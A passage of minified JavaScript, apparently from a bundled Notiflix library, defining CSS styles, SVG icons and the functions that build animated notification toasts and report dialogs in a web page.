id="NXLoadingNotiflixLib" width="'+_+'" height="'+_+'" viewBox="0 0 200 200"><defs><style>@keyframes notiflix-n{0%{stroke-dashoffset:1000}to{stroke-dashoffset:0}}@keyframes notiflix-x{0%{stroke-dashoffset:1000}to{stroke-dashoffset:0}}@keyframes notiflix-dot{0%,to{stroke-width:0}50%{stroke-width:12}}.nx-icon-line{stroke:'+N+';stroke-width:12;stroke-linecap:round;stroke-linejoin:round;stroke-miterlimit:22;fill:none}</style></defs><path d="M47.97 135.05a6.5 6.5 0 1 1 0 13 6.5 6.5 0 0 1 0-13z" style="animation-name:notiflix-dot;animation-timing-function:ease-in-out;animation-duration:1.25s;animation-iteration-count:infinite;animation-direction:normal" fill="'+P+'" stroke="'+P+'" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="22" stroke-width="12"/><path class="nx-icon-line" d="M10.14 144.76V87.55c0-5.68-4.54-41.36 37.83-41.36 42.36 0 37.82 35.68 37.82 41.36v57.21" style="animation-name:notiflix-n;animation-timing-function:linear;animation-duration:2.5s;animation-delay:0s;animation-iteration-count:infinite;animation-direction:normal" stroke-dasharray="500"/><path class="nx-icon-line" d="M115.06 144.49c24.98-32.68 49.96-65.35 74.94-98.03M114.89 46.6c25.09 32.58 50.19 65.17 75.29 97.75" style="animation-name:notiflix-x;animation-timing-function:linear;animation-duration:2.5s;animation-delay:.2s;animation-iteration-count:infinite;animation-direction:normal" stroke-dasharray="500"/></svg>';return D},ke=function(){return'[id^=NotiflixNotifyWrap]{pointer-events:none;position:fixed;z-index:4001;opacity:1;right:10px;top:10px;width:280px;max-width:96%;-webkit-box-sizing:border-box;box-sizing:border-box;background:transparent}[id^=NotiflixNotifyWrap].nx-flex-center-center{max-height:calc(100vh - 20px);overflow-x:hidden;overflow-y:auto;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-wrap:wrap;-ms-flex-wrap:wrap;flex-wrap:wrap;-webkit-box-orient:vertical;-webkit-box-direction:normal;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;-webkit-box-pack:center;-webkit-justify-content:center;-ms-flex-pack:center;justify-content:center;-webkit-box-align:center;-webkit-align-items:center;-ms-flex-align:center;align-items:center;margin:auto}[id^=NotiflixNotifyWrap]::-webkit-scrollbar{width:0;height:0}[id^=NotiflixNotifyWrap]::-webkit-scrollbar-thumb{background:transparent}[id^=NotiflixNotifyWrap]::-webkit-scrollbar-track{background:transparent}[id^=NotiflixNotifyWrap] *{-webkit-box-sizing:border-box;box-sizing:border-box}[id^=NotiflixNotifyOverlay]{-webkit-transition:background .3s ease-in-out;-o-transition:background .3s ease-in-out;transition:background .3s ease-in-out}[id^=NotiflixNotifyWrap]>div{pointer-events:all;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;font-family:"Quicksand",-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;width:100%;display:-webkit-inline-box;display:-webkit-inline-flex;display:-ms-inline-flexbox;display:inline-flex;-webkit-flex-wrap:wrap;-ms-flex-wrap:wrap;flex-wrap:wrap;-webkit-box-align:center;-webkit-align-items:center;-ms-flex-align:center;align-items:center;position:relative;margin:0 0 10px;border-radius:5px;background:#1e1e1e;color:#fff;padding:10px 12px;font-size:14px;line-height:1.4}[id^=NotiflixNotifyWrap]>div:last-child{margin:0}[id^=NotiflixNotifyWrap]>div.nx-with-callback{cursor:pointer}[id^=NotiflixNotifyWrap]>div.nx-with-icon{padding:8px;min-height:56px}[id^=NotiflixNotifyWrap]>div.nx-paused{cursor:auto}[id^=NotiflixNotifyWrap]>div.nx-notify-click-to-close{cursor:pointer}[id^=NotiflixNotifyWrap]>div.nx-with-close-button{padding:10px 36px 10px 12px}[id^=NotiflixNotifyWrap]>div.nx-with-icon.nx-with-close-button{padding:6px 36px 6px 6px}[id^=NotiflixNotifyWrap]>div>span.nx-message{cursor:inherit;font-weight:normal;font-family:inherit!important;word-break:break-all;word-break:break-word}[id^=NotiflixNotifyWrap]>div>span.nx-close-button{cursor:pointer;-webkit-transition:all .2s ease-in-out;-o-transition:all .2s ease-in-out;transition:all .2s ease-in-out;position:absolute;right:8px;top:0;bottom:0;margin:auto;color:inherit;width:20px;height:20px}[id^=NotiflixNotifyWrap]>div>span.nx-close-button:hover{-webkit-transform:rotate(90deg);transform:rotate(90deg)}[id^=NotiflixNotifyWrap]>div>span.nx-close-button>svg{position:absolute;width:16px;height:16px;right:2px;top:2px}[id^=NotiflixNotifyWrap]>div>.nx-message-icon{position:absolute;width:40px;height:40px;font-size:30px;line-height:40px;text-align:center;left:8px;top:0;bottom:0;margin:auto;border-radius:inherit}[id^=NotiflixNotifyWrap]>div>.nx-message-icon-fa.nx-message-icon-fa-shadow{color:inherit;background:rgba(0,0,0,.15);-webkit-box-shadow:inset 0 0 34px rgba(0,0,0,.2);box-shadow:inset 0 0 34px rgba(0,0,0,.2);text-shadow:0 0 10px rgba(0,0,0,.3)}[id^=NotiflixNotifyWrap]>div>span.nx-with-icon{position:relative;float:left;width:calc(100% - 40px);margin:0 0 0 40px;padding:0 0 0 10px;-webkit-box-sizing:border-box;box-sizing:border-box}[id^=NotiflixNotifyWrap]>div.nx-rtl-on>.nx-message-icon{left:auto;right:8px}[id^=NotiflixNotifyWrap]>div.nx-rtl-on>span.nx-with-icon{padding:0 10px 0 0;margin:0 40px 0 0}[id^=NotiflixNotifyWrap]>div.nx-rtl-on>span.nx-close-button{right:auto;left:8px}[id^=NotiflixNotifyWrap]>div.nx-with-icon.nx-with-close-button.nx-rtl-on{padding:6px 6px 6px 36px}[id^=NotiflixNotifyWrap]>div.nx-with-close-button.nx-rtl-on{padding:10px 12px 10px 36px}[id^=NotiflixNotifyOverlay].nx-with-animation,[id^=NotiflixNotifyWrap]>div.nx-with-animation.nx-fade{-webkit-animation:notify-animation-fade .3s ease-in-out 0s normal;animation:notify-animation-fade .3s ease-in-out 0s normal}@-webkit-keyframes notify-animation-fade{0%{opacity:0}100%{opacity:1}}@keyframes notify-animation-fade{0%{opacity:0}100%{opacity:1}}[id^=NotiflixNotifyWrap]>div.nx-with-animation.nx-zoom{-webkit-animation:notify-animation-zoom .3s ease-in-out 0s normal;animation:notify-animation-zoom .3s ease-in-out 0s normal}@-webkit-keyframes notify-animation-zoom{0%{-webkit-transform:scale(0);transform:scale(0)}50%{-webkit-transform:scale(1.05);transform:scale(1.05)}100%{-webkit-transform:scale(1);transform:scale(1)}}@keyframes notify-animation-zoom{0%{-webkit-transform:scale(0);transform:scale(0)}50%{-webkit-transform:scale(1.05);transform:scale(1.05)}100%{-webkit-transform:scale(1);transform:scale(1)}}[id^=NotiflixNotifyWrap]>div.nx-with-animation.nx-from-right{-webkit-animation:notify-animation-from-right .3s ease-in-out 0s normal;animation:notify-animation-from-right .3s ease-in-out 0s normal}@-webkit-keyframes notify-animation-from-right{0%{right:-300px;opacity:0}50%{right:8px;opacity:1}100%{right:0;opacity:1}}@keyframes notify-animation-from-right{0%{right:-300px;opacity:0}50%{right:8px;opacity:1}100%{right:0;opacity:1}}[id^=NotiflixNotifyWrap]>div.nx-with-animation.nx-from-left{-webkit-animation:notify-animation-from-left .3s ease-in-out 0s normal;animation:notify-animation-from-left .3s ease-in-out 0s normal}@-webkit-keyframes notify-animation-from-left{0%{left:-300px;opacity:0}50%{left:8px;opacity:1}100%{left:0;opacity:1}}@keyframes notify-animation-from-left{0%{left:-300px;opacity:0}50%{left:8px;opacity:1}100%{left:0;opacity:1}}[id^=NotiflixNotifyWrap]>div.nx-with-animation.nx-from-top{-webkit-animation:notify-animation-from-top .3s ease-in-out 0s normal;animation:notify-animation-from-top .3s ease-in-out 0s normal}@-webkit-keyframes notify-animation-from-top{0%{top:-50px;opacity:0}50%{top:8px;opacity:1}100%{top:0;opacity:1}}@keyframes notify-animation-from-top{0%{top:-50px;opacity:0}50%{top:8px;opacity:1}100%{top:0;opacity:1}}[id^=NotiflixNotifyWrap]>div.nx-with-animation.nx-from-bottom{-webkit-animation:notify-animation-from-bottom .3s ease-in-out 0s normal;animation:notify-animation-from-bottom .3s ease-in-out 0s normal}@-webkit-keyframes notify-animation-from-bottom{0%{bottom:-50px;opacity:0}50%{bottom:8px;opacity:1}100%{bottom:0;opacity:1}}@keyframes notify-animation-from-bottom{0%{bottom:-50px;opacity:0}50%{bottom:8px;opacity:1}100%{bottom:0;opacity:1}}[id^=NotiflixNotifyOverlay].nx-with-animation.nx-remove,[id^=NotiflixNotifyWrap]>div.nx-with-animation.nx-fade.nx-remove{opacity:0;-webkit-animation:notify-remove-fade .3s ease-in-out 0s normal;animation:notify-remove-fade .3s ease-in-out 0s normal}@-webkit-keyframes notify-remove-fade{0%{opacity:1}100%{opacity:0}}@keyframes notify-remove-fade{0%{opacity:1}100%{opacity:0}}[id^=NotiflixNotifyWrap]>div.nx-with-animation.nx-zoom.nx-remove{-webkit-transform:scale(0);transform:scale(0);-webkit-animation:notify-remove-zoom .3s ease-in-out 0s normal;animation:notify-remove-zoom .3s ease-in-out 0s normal}@-webkit-keyframes notify-remove-zoom{0%{-webkit-transform:scale(1);transform:scale(1)}50%{-webkit-transform:scale(1.05);transform:scale(1.05)}100%{-webkit-transform:scale(0);transform:scale(0)}}@keyframes notify-remove-zoom{0%{-webkit-transform:scale(1);transform:scale(1)}50%{-webkit-transform:scale(1.05);transform:scale(1.05)}100%{-webkit-transform:scale(0);transform:scale(0)}}[id^=NotiflixNotifyWrap]>div.nx-with-animation.nx-from-top.nx-remove{opacity:0;-webkit-animation:notify-remove-to-top .3s ease-in-out 0s normal;animation:notify-remove-to-top .3s ease-in-out 0s normal}@-webkit-keyframes notify-remove-to-top{0%{top:0;opacity:1}50%{top:8px;opacity:1}100%{top:-50px;opacity:0}}@keyframes notify-remove-to-top{0%{top:0;opacity:1}50%{top:8px;opacity:1}100%{top:-50px;opacity:0}}[id^=NotiflixNotifyWrap]>div.nx-with-animation.nx-from-right.nx-remove{opacity:0;-webkit-animation:notify-remove-to-right .3s ease-in-out 0s normal;animation:notify-remove-to-right .3s ease-in-out 0s normal}@-webkit-keyframes notify-remove-to-right{0%{right:0;opacity:1}50%{right:8px;opacity:1}100%{right:-300px;opacity:0}}@keyframes notify-remove-to-right{0%{right:0;opacity:1}50%{right:8px;opacity:1}100%{right:-300px;opacity:0}}[id^=NotiflixNotifyWrap]>div.nx-with-animation.nx-from-bottom.nx-remove{opacity:0;-webkit-animation:notify-remove-to-bottom .3s ease-in-out 0s normal;animation:notify-remove-to-bottom .3s ease-in-out 0s normal}@-webkit-keyframes notify-remove-to-bottom{0%{bottom:0;opacity:1}50%{bottom:8px;opacity:1}100%{bottom:-50px;opacity:0}}@keyframes notify-remove-to-bottom{0%{bottom:0;opacity:1}50%{bottom:8px;opacity:1}100%{bottom:-50px;opacity:0}}[id^=NotiflixNotifyWrap]>div.nx-with-animation.nx-from-left.nx-remove{opacity:0;-webkit-animation:notify-remove-to-left .3s ease-in-out 0s normal;animation:notify-remove-to-left .3s ease-in-out 0s normal}@-webkit-keyframes notify-remove-to-left{0%{left:0;opacity:1}50%{left:8px;opacity:1}100%{left:-300px;opacity:0}}@keyframes notify-remove-to-left{0%{left:0;opacity:1}50%{left:8px;opacity:1}100%{left:-300px;opacity:0}}'},ye=0,he=function(_,N,P,D){if(!L("body"))return!1;n||T.Notify.init({});var V=I(!0,n,{});if(typeof P=="object"&&!Array.isArray(P)||typeof D=="object"&&!Array.isArray(D)){var U={};typeof P=="object"?U=P:typeof D=="object"&&(U=D),n=I(!0,n,U)}var z=n[_.toLocaleLowerCase("en")];ye++,typeof N!="string"&&(N="Notiflix "+_),n.plainText&&(N=A(N)),!n.plainText&&N.length>n.messageMaxLength&&(n=I(!0,n,{closeButton:!0,messageMaxLength:150}),N='Possible HTML Tags Error: The "plainText" option is "false" and the notification content length is more than the "messageMaxLength" option.'),N.length>n.messageMaxLength&&(N=N.substring(0,n.messageMaxLength)+"..."),n.fontAwesomeIconStyle==="shadow"&&(z.fontAwesomeIconColor=z.background),n.cssAnimation||(n.cssAnimationDuration=0);var H=t.document.getElementById(m.wrapID)||t.document.createElement("div");if(H.id=m.wrapID,H.style.width=n.width,H.style.zIndex=n.zindex,H.style.opacity=n.opacity,n.position==="center-center"?(H.style.left=n.distance,H.style.top=n.distance,H.style.right=n.distance,H.style.bottom=n.distance,H.style.margin="auto",H.classList.add("nx-flex-center-center"),H.style.maxHeight="calc((100vh - "+n.distance+") - "+n.distance+")",H.style.display="flex",H.style.flexWrap="wrap",H.style.flexDirection="column",H.style.justifyContent="center",H.style.alignItems="center",H.style.pointerEvents="none"):n.position==="center-top"?(H.style.left=n.distance,H.style.right=n.distance,H.style.top=n.distance,H.style.bottom="auto",H.style.margin="auto"):n.position==="center-bottom"?(H.style.left=n.distance,H.style.right=n.distance,H.style.bottom=n.distance,H.style.top="auto",H.style.margin="auto"):n.position==="right-bottom"?(H.style.right=n.distance,H.style.bottom=n.distance,H.style.top="auto",H.style.left="auto"):n.position==="left-top"?(H.style.left=n.distance,H.style.top=n.distance,H.style.right="auto",H.style.bottom="auto"):n.position==="left-bottom"?(H.style.left=n.distance,H.style.bottom=n.distance,H.style.top="auto",H.style.right="auto"):(H.style.right=n.distance,H.style.top=n.distance,H.style.left="auto",H.style.bottom="auto"),n.backOverlay){var Y=t.document.getElementById(m.overlayID)||t.document.createElement("div");Y.id=m.overlayID,Y.style.width="100%",Y.style.height="100%",Y.style.position="fixed",Y.style.zIndex=n.zindex-1,Y.style.left=0,Y.style.top=0,Y.style.right=0,Y.style.bottom=0,Y.style.background=z.backOverlayColor||n.backOverlayColor,Y.className=n.cssAnimation?"nx-with-animation":"",Y.style.animationDuration=n.cssAnimation?n.cssAnimationDuration+"ms":"",t.document.getElementById(m.overlayID)||t.document.querySelector("div.main").appendChild(Y)}t.document.getElementById(m.wrapID)||t.document.querySelector("div.main").appendChild(H);var B=t.document.createElement("div");B.id=n.ID+"-"+ye,B.className=n.className+" "+z.childClassName+" "+(n.cssAnimation?"nx-with-animation":"")+" "+(n.useIcon?"nx-with-icon":"")+" nx-"+n.cssAnimationStyle+" "+(n.closeButton&&typeof P!="function"?"nx-with-close-button":"")+" "+(typeof P=="function"?"nx-with-callback":"")+" "+(n.clickToClose?"nx-notify-click-to-close":""),B.style.fontSize=n.fontSize,B.style.color=z.textColor,B.style.background=z.background,B.style.borderRadius=n.borderRadius,B.style.pointerEvents="all",n.rtl&&(B.setAttribute("dir","rtl"),B.classList.add("nx-rtl-on")),B.style.fontFamily='"'+n.fontFamily+'", '+u,n.cssAnimation&&(B.style.animationDuration=n.cssAnimationDuration+"ms");var F="";if(n.closeButton&&typeof P!="function"&&(F='<span class="nx-close-button"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 20 20"><g><path fill="'+z.notiflixIconColor+'" d="M0.38 2.19l7.8 7.81 -7.8 7.81c-0.51,0.5 -0.51,1.31 -0.01,1.81 0.25,0.25 0.57,0.38 0.91,0.38 0.34,0 0.67,-0.14 0.91,-0.38l7.81 -7.81 7.81 7.81c0.24,0.24 0.57,0.38 0.91,0.38 0.34,0 0.66,-0.14 0.9,-0.38 0.51,-0.5 0.51,-1.31 0,-1.81l-7.81 -7.81 7.81 -7.81c0.51,-0.5 0.51,-1.31 0,-1.82 -0.5,-0.5 -1.31,-0.5 -1.81,0l-7.81 7.81 -7.81 -7.81c-0.5,-0.5 -1.31,-0.5 -1.81,0 -0.51,0.51 -0.51,1.32 0,1.82z"/></g></svg></span>'),!n.useIcon)B.innerHTML='<span class="nx-message">'+N+"</span>"+(n.closeButton?F:"");else if(n.useFontAwesome)B.innerHTML='<i style="color:'+z.fontAwesomeIconColor+"; font-size:"+n.fontAwesomeIconSize+';" class="nx-message-icon nx-message-icon-fa '+z.fontAwesomeClassName+" "+(n.fontAwesomeIconStyle==="shadow"?"nx-message-icon-fa-shadow":"nx-message-icon-fa-basic")+'"></i><span class="nx-message nx-with-icon">'+N+"</span>"+(n.closeButton?F:"");else{var ee="";_===f.Success?ee='<svg class="nx-message-icon" xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewBox="0 0 40 40"><g><path fill="'+z.notiflixIconColor+'" d="M20 0c11.03,0 20,8.97 20,20 0,11.03 -8.97,20 -20,20 -11.03,0 -20,-8.97 -20,-20 0,-11.03 8.97,-20 20,-20zm0 37.98c9.92,0 17.98,-8.06 17.98,-17.98 0,-9.92 -8.06,-17.98 -17.98,-17.98 -9.92,0 -17.98,8.06 -17.98,17.98 0,9.92 8.06,17.98 17.98,17.98zm-2.4 -13.29l11.52 -12.96c0.37,-0.41 1.01,-0.45 1.42,-0.08 0.42,0.37 0.46,1 0.09,1.42l-12.16 13.67c-0.19,0.22 -0.46,0.34 -0.75,0.34 -0.23,0 -0.45,-0.07 -0.63,-0.22l-7.6 -6.07c-0.43,-0.35 -0.5,-0.99 -0.16,-1.42 0.35,-0.43 0.99,-0.5 1.42,-0.16l6.85 5.48z"/></g></svg>':_===f.Failure?ee='<svg class="nx-message-icon" xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewBox="0 0 40 40"><g><path fill="'+z.notiflixIconColor+'" d="M20 0c11.03,0 20,8.97 20,20 0,11.03 -8.97,20 -20,20 -11.03,0 -20,-8.97 -20,-20 0,-11.03 8.97,-20 20,-20zm0 37.98c9.92,0 17.98,-8.06 17.98,-17.98 0,-9.92 -8.06,-17.98 -17.98,-17.98 -9.92,0 -17.98,8.06 -17.98,17.98 0,9.92 8.06,17.98 17.98,17.98zm1.42 -17.98l6.13 6.12c0.39,0.4 0.39,1.04 0,1.43 -0.19,0.19 -0.45,0.29 -0.71,0.29 -0.27,0 -0.53,-0.1 -0.72,-0.29l-6.12 -6.13 -6.13 6.13c-0.19,0.19 -0.44,0.29 -0.71,0.29 -0.27,0 -0.52,-0.1 -0.71,-0.29 -0.39,-0.39 -0.39,-1.03 0,-1.43l6.13 -6.12 -6.13 -6.13c-0.39,-0.39 -0.39,-1.03 0,-1.42 0.39,-0.39 1.03,-0.39 1.42,0l6.13 6.12 6.12 -6.12c0.4,-0.39 1.04,-0.39 1.43,0 0.39,0.39 0.39,1.03 0,1.42l-6.13 6.13z"/></g></svg>':_===f.Warning?ee='<svg class="nx-message-icon" xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewBox="0 0 40 40"><g><path fill="'+z.notiflixIconColor+'" d="M21.91 3.48l17.8 30.89c0.84,1.46 -0.23,3.25 -1.91,3.25l-35.6 0c-1.68,0 -2.75,-1.79 -1.91,-3.25l17.8 -30.89c0.85,-1.47 2.97,-1.47 3.82,0zm16.15 31.84l-17.8 -30.89c-0.11,-0.2 -0.41,-0.2 -0.52,0l-17.8 30.89c-0.12,0.2 0.05,0.4 0.26,0.4l35.6 0c0.21,0 0.38,-0.2 0.26,-0.4zm-19.01 -4.12l0 -1.05c0,-0.53 0.42,-0.95 0.95,-0.95 0.53,0 0.95,0.42 0.95,0.95l0 1.05c0,0.53 -0.42,0.95 -0.95,0.95 -0.53,0 -0.95,-0.42 -0.95,-0.95zm0 -4.66l0 -13.39c0,-0.52 0.42,-0.95 0.95,-0.95 0.53,0 0.95,0.43 0.95,0.95l0 13.39c0,0.53 -0.42,0.96 -0.95,0.96 -0.53,0 -0.95,-0.43 -0.95,-0.96z"/></g></svg>':_===f.Info&&(ee='<svg class="nx-message-icon" xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewBox="0 0 40 40"><g><path fill="'+z.notiflixIconColor+'" d="M20 0c11.03,0 20,8.97 20,20 0,11.03 -8.97,20 -20,20 -11.03,0 -20,-8.97 -20,-20 0,-11.03 8.97,-20 20,-20zm0 37.98c9.92,0 17.98,-8.06 17.98,-17.98 0,-9.92 -8.06,-17.98 -17.98,-17.98 -9.92,0 -17.98,8.06 -17.98,17.98 0,9.92 8.06,17.98 17.98,17.98zm-0.99 -23.3c0,-0.54 0.44,-0.98 0.99,-0.98 0.55,0 0.99,0.44 0.99,0.98l0 15.86c0,0.55 -0.44,0.99 -0.99,0.99 -0.55,0 -0.99,-0.44 -0.99,-0.99l0 -15.86zm0 -5.22c0,-0.55 0.44,-0.99 0.99,-0.99 0.55,0 0.99,0.44 0.99,0.99l0 1.09c0,0.54 -0.44,0.99 -0.99,0.99 -0.55,0 -0.99,-0.45 -0.99,-0.99l0 -1.09z"/></g></svg>'),B.innerHTML=ee+'<span class="nx-message nx-with-icon">'+N+"</span>"+(n.closeButton?F:"")}if(n.position==="left-bottom"||n.position==="right-bottom"){var te=t.document.getElementById(m.wrapID);te.insertBefore(B,te.firstChild)}else t.document.getElementById(m.wrapID).appendChild(B);var re=t.document.getElementById(B.id);if(re){var ae,ie,ce=function(){re.classList.add("nx-remove");var ue=t.document.getElementById(m.overlayID);ue&&0>=H.childElementCount&&ue.classList.add("nx-remove"),clearTimeout(ae)},ve=function(){if(re&&re.parentNode!==null&&re.parentNode.removeChild(re),0>=H.childElementCount&&H.parentNode!==null){H.parentNode.removeChild(H);var ue=t.document.getElementById(m.overlayID);ue&&ue.parentNode!==null&&ue.parentNode.removeChild(ue)}clearTimeout(ie)};if(n.closeButton&&typeof P!="function"){var Ee=t.document.getElementById(B.id).querySelector("span.nx-close-button");Ee.addEventListener("click",function(){ce();var ue=setTimeout(function(){ve(),clearTimeout(ue)},n.cssAnimationDuration)})}if((typeof P=="function"||n.clickToClose)&&re.addEventListener("click",function(){typeof P=="function"&&P(),ce();var ue=setTimeout(function(){ve(),clearTimeout(ue)},n.cssAnimationDuration)}),!n.closeButton&&typeof P!="function"){var be=function(){ae=setTimeout(function(){ce()},n.timeout),ie=setTimeout(function(){ve()},n.timeout+n.cssAnimationDuration)};be(),n.pauseOnHover&&(re.addEventListener("mouseenter",function(){re.classList.add("nx-paused"),clearTimeout(ae),clearTimeout(ie)}),re.addEventListener("mouseleave",function(){re.classList.remove("nx-paused"),be()}))}}if(n.showOnlyTheLastOne&&0<ye)for(var Se,pe=t.document.querySelectorAll("[id^="+n.ID+"-]:not([id="+n.ID+"-"+ye+"])"),_e=0;_e<pe.length;_e++)Se=pe[_e],Se.parentNode!==null&&Se.parentNode.removeChild(Se);n=I(!0,n,V)},Ce=function(){return'[id^=NotiflixReportWrap]{position:fixed;z-index:4002;width:100%;height:100%;-webkit-box-sizing:border-box;box-sizing:border-box;font-family:"Quicksand",-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;left:0;top:0;padding:10px;color:#1e1e1e;border-radius:25px;background:transparent;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-wrap:wrap;-ms-flex-wrap:wrap;flex-wrap:wrap;-webkit-box-orient:vertical;-webkit-box-direction:normal;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;-webkit-box-align:center;-webkit-align-items:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-webkit-justify-content:center;-ms-flex-pack:center;justify-content:center}[id^=NotiflixReportWrap] *{-webkit-box-sizing:border-box;box-sizing:border-box}[id^=NotiflixReportWrap]>div[class*="-overlay"]{width:100%;height:100%;left:0;top:0;background:rgba(255,255,255,.5);position:fixed;z-index:0}[id^=NotiflixReportWrap]>div.nx-report-click-to-close{cursor:pointer}[id^=NotiflixReportWrap]>div[class*="-content"]{width:320px;max-width:100%;max-height:96vh;overflow-x:hidden;overflow-y:auto;border-radius:inherit;padding:10px;-webkit-filter:drop-shadow(0 0 5px rgba(0,0,0,0.05));filter:drop-shadow(0 0 5px rgba(0, 0, 0, .05));border:1px solid rgba(0,0,0,.03);background:#f8f8f8;position:relative;z-index:1}[id^=NotiflixReportWrap]>div[class*="-content"]::-webkit-scrollbar{width:0;height:0}[id^=NotiflixReportWrap]>div[class*="-content"]::-webkit-scrollbar-thumb{background:transparent}[id^=NotiflixReportWrap]>div[class*="-content"]::-webkit-scrollbar-track{background:transparent}[id^=NotiflixReportWrap]>div[class*="-content"]>div[class$="-icon"]{-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;width:110px;height:110px;display:block;margin:6px auto 12px}[id^=NotiflixReportWrap]>div[class*="-content"]>div[class$="-icon"] svg{min-width:100%;max-width:100%;height:auto}[id^=NotiflixReportWrap]>*>h5{word-break:break-all;word-break:break-word;font-family:inherit!important;font-size:16px;font-weight:500;line-height:1.4;margin:0 0 10px;padding:0 0 10px;border-bottom:1px solid rgba(0,0,0,.1);float:left;width:100%;text-align:center}[id^=NotiflixReportWrap]>*>p{word-break:break-all;word-break:break-word;font-family:inherit!important;font-size:13px;line-height:1.4;font-weight:normal;float:left;width:100%;padding:0 10px;margin:0 0 10px}[id^=NotiflixReportWrap] a#NXReportButton{word-break:break-all;word-break:break-word;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;font-family:inherit!important;-webkit-transition:all .25s ease-in-out;-o-transition:all .25s ease-in-out;transition:all .25s ease-in-out;cursor:pointer;float:right;padding:7px 17px;background:#32c682;font-size:14px;line-height:1.4;font-weight:500;border-radius:inherit!important;color:#fff}[id^=NotiflixReportWrap] a#NXReportButton:hover{-webkit-box-shadow:inset 0 -60px 5px -5px rgba(0,0,0,.25);box-shadow:inset 0 -60px 5px -5px rgba(0,0,0,.25)}[id^=NotiflixReportWrap].nx-rtl-on a#NXReportButton{float:left}[id^=NotiflixReportWrap]>div[class*="-overlay"].nx-with-animation{-webkit-animation:report-overlay-animation .3s ease-in-out 0s normal;animation:report-overlay-animation .3s ease-in-out 0s normal}@-webkit-keyframes report-overlay-animation{0%{opacity:0}100%{opacity:1}}@keyframes report-overlay-animation{0%{opacity:0}100%{opacity:1}}[id^=NotiflixReportWrap]>div[class*="-content"].nx-with-animation.nx-fade{-webkit-animation:report-animation-fade .3s ease-in-out 0s normal;animation:report-animation-fade .3s ease-in-out 0s normal}@-webkit-keyframes report-animation-fade{0%{opacity:0}100%{opacity:1}}@keyframes report-animation-fade{0%{opacity:0}100%{opacity:1}}[id^=NotiflixReportWrap]>div[class*="-content"].nx-with-animation.nx-zoom{-webkit-animation:report-animation-zoom .3s ease-in-out 0s normal;animation:report-animation-zoom .3s ease-in-out 0s normal}@-webkit-keyframes report-animation-zoom{0%{opacity:0;-webkit-transform:scale(.5);transform:scale(.5)}50%{opacity:1;-webkit-transform:scale(1.05);transform:scale(1.05)}100%{opacity:1;-webkit-transform:scale(1);transform:scale(1)}}@keyframes report-animation-zoom{0%{opacity:0;-webkit-transform:scale(.5);transform:scale(.5)}50%{opacity:1;-webkit-transform:scale(1.05);transform:scale(1.05)}100%{opacity:1;-webkit-transform:scale(1);transform:scale(1)}}[id^=NotiflixReportWrap].nx-remove>div[class*="-overlay"].nx-with-animation{opacity:0;-webkit-animation:report-overlay-animation-remove .3s ease-in-out 0s normal;animation:report-overlay-animation-remove .3s ease-in-out 0s normal}@-webkit-keyframes report-overlay-animation-remove{0%{opacity:1}100%{opacity:0}}@keyframes report-overlay-animation-remove{0%{opacity:1}100%{opacity:0}}[id^=NotiflixReportWrap].nx-remove>div[class*="-content"].nx-with-animation.nx-fade{opacity:0;-webkit-animation:report-animation-fade-remove .3s ease-in-out 0s normal;animation:report-animation-fade-remove .3s ease-in-out 0s normal}@-webkit-keyframes report-animation-fade-remove{0%{opacity:1}100%{opacity:0}}@keyframes report-animation-fade-remove{0%{opacity:1}100%{opacity:0}}[id^=NotiflixReportWrap].nx-remove>div[class*="-content"].nx-with-animation.nx-zoom{opacity:0;-webkit-animation:report-animation-zoom-remove .3s ease-in-out 0s normal;animation:report-animation-zoom-remove .3s ease-in-out 0s normal}@-webkit-keyframes report-animation-zoom-remove{0%{opacity:1;-webkit-transform:scale(1);transform:scale(1)}50%{opacity:.5;-webkit-transform:scale(1.05);transform:scale(1.05)}100%{opacity:0;-webkit-transform:scale(0);transform:scale(0)}}@keyframes report-animation-zoom-remove{0%{opacity:1;-webkit-transform:scale(1);transform:scale(1)}50%{opacity:.5;-webkit-transform:scale(1.05);transform:scale(1.05)}100%{opacity:0;-webkit-transform:scale(0);transform:scale(0)}}'},we=function(_,N,P,D,V,U){if(!L("body"))return!1;s||T.Report.init({});var z={};if(typeof V=="object"&&!Array.isArray(V)||typeof U=="object"&&!Array.isArray(U)){var H={};typeof V=="object"?H=V:typeof U=="object"&&(H=U),z=I(!0,s,{}),s=I(!0,s,H)}var Y=s[_.toLocaleLowerCase("en")];typeof N!="string"&&(N="Notiflix "+_),typeof P!="string"&&(_===g.Success?P='"Do not try to become a person of success but try to become a person of value." <br><br>- Albert Einstein':_===g.Failure?P='"Failure is simply the opportunity to begin again, this time more intelligently." <br><br>- Henry Ford':_===g.Warning?P='"The peoples who want to live comfortably without producing and fatigue; they are doomed to lose their dignity, then liberty, and then independence and destiny." <br><br>- Mustafa Kemal Ataturk':_===g.Info&&(P='"Knowledge rests not upon truth alone, but upon error also." <br><br>- Carl Gustav Jung')),typeof D!="string"&&(D="Okay"),s.plainText&&(N=A(N),P=A(P),D=A(D)),s.plainText||(N.length>s.titleMaxLength&&(N="Possible HTML Tags Error",P='The "plainText" option is "false" and the title content length is more than the "titleMaxLength" option.',D="Okay"),P.length>s.messageMaxLength&&(N="Possible HTML Tags Error",P='The "plainText" option is "false" and the message content length is more than the "messageMaxLength" option.',D="Okay"),D.length>s.buttonMaxLength&&(N="Possible HTML Tags Error",P='The "plainText" option is "false" and the button content length is more than the "buttonMaxLength" 